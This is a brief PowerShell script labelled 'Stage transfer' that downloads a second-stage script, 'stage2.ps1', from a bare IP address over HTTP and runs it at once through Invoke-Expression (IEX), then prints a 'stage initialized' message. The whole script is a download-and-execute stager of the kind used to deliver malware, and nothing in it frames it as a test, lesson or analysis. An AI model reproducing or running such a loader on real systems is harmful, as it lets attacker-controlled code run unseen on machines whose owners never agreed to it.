<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://203.0.113.144:80/stage2.ps1',
    [int]$StageTimeout = 76
)
IEX (Invoke-WebRequest -Uri $FetchUrl -UseBasicParsing).Content
Write-Output "stage 30 initialized"
